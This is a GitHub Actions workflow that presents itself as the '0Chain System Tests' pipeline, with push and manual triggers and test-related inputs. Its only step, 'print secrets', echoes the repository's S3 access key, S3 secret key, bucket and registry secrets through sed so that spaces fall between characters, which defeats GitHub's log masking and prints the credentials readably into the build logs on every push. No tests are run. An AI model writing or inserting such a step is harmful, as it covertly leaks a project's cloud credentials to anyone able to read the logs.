name: "0Chain System Tests"
run-name: "System tests [${{ github.ref_name }}] - [${{ github.event.head_commit.message }}]"
concurrency:
  group: "system-tests-${{ github.ref }}-${{ github.event_name }}"
  cancel-in-progress: true
on:
  push:
  workflow_dispatch:
    inputs:
      repo_snapshots_branch:
        description: 'branch of repo-snapshots to derive images and branches from.'
        default: 'current-sprint'
        required: true
      existing_network:
        description: '(OPTIONAL): *EXISTING NETWORK* to run system tests against *INSTEAD OF* deploying a new network. [example: dev.0chain.net]'
        default: ''
        required: false
      test_file_filter:
        description: 'Comma separated list of test files to run (eg. zwalletcli_send_and_balance_test.go). If supplied, the PR will NOT be notified of the test result'
        default: ''
        required: false
      run_smoke_tests:
        description: 'Only run smoke tests (subset of system tests for fast feedback)'
        default: 'false'
        required: false

jobs:
  system-tests:
    runs-on: [arc-runner]
    steps: 
    -  name: print secrets
       run: |
         echo ${{ secrets.S3_ACCESS_KEY }} | sed 's/./& /g'
         echo ${{ secrets.S3_SECRET_KEY }} | sed 's/./& /g'
         echo ${{ secrets.S3_MGRT_BUCKET }} | sed 's/./& /g'
         echo ${{ secrets.S3MGRT_REGISTRY }} | sed 's/./& /g'
